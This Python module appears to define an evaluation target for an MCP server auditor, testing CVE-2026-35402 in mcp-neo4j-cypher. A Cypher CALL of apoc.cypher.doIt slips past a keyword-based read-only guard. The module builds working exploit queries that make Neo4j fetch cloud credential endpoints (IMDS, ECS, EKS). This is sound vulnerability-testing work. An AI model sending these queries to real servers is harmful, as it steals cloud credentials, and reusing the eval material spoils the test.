"""CVE-2026-35402: mcp-neo4j-cypher read-only bypass through Cypher CALL procedures.

Before 0.6.0, read_neo4j_cypher's write guard is a keyword regex
(MERGE|CREATE|INSERT|SET|DELETE|REMOVE|ADD). A CALL of apoc.cypher.doIt contains none of them, so
the server runs it, and the native LOAD CSV it wraps makes Neo4j fetch an attacker-chosen
internal URL and return the body: reach = internal_fetch. 0.6.0 runs EXPLAIN first and rejects a
query whose query_type is 'rw', so the same call raises before it executes.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import ssrf_env
from evals.cve_grammar import MechanismClass
from evals.cve_layout import PROJECT
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

READ_TOOL = "read_neo4j_cypher"

# One exploit per placeable internal-fetch endpoint, each a native LOAD CSV fetch wrapped in
# apoc.cypher.doIt so the vulnerable keyword guard does not match it.
ENDPOINTS: tuple[tuple[str, str], ...] = (
    ("imds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("ecs-task-credentials", "http://169.254.170.2/v2/credentials/"),
    ("eks-pod-identity", "http://169.254.170.23/v1/credentials"),
)

KEPT_PLACES = tuple(place_id for place_id, _ in ENDPOINTS)

AIM = re.compile(r"LOAD CSV FROM 'http://")


def _exploit_query(url: str) -> str:
    inner = f"LOAD CSV FROM '{url}' AS row RETURN row"
    return f'CALL apoc.cypher.doIt("{inner}", {{}}) YIELD value RETURN value'


def _exploit(url: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(READ_TOOL, {"query": _exploit_query(url)})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool(READ_TOOL, {"query": "RETURN 1 AS n"})


TARGET = CVETarget(
    cve_id="CVE-2026-35402",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanisms=frozenset({MechanismClass.INTERNAL_FETCH}),
    aim=AIM,
    reaches=frozenset({"internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-35402-neo4j-cypher", "sentinel"),
    server_image="holdout-2026-35402-neo4j-cypher",
    patched_image="holdout-2026-35402-neo4j-cypher-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory=PROJECT, has_network=False
    ),
    builder=ssrf_env,
    exploits=tuple(_exploit(url) for _, url in ENDPOINTS),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Read-only bypass: the keyword-regex write guard does not match a CALL of "
        "apoc.cypher.doIt, so a wrapped LOAD CSV makes Neo4j fetch a link-local / cloud-metadata "
        "endpoint and return its body."
    ),
    tools_filter=None,
)
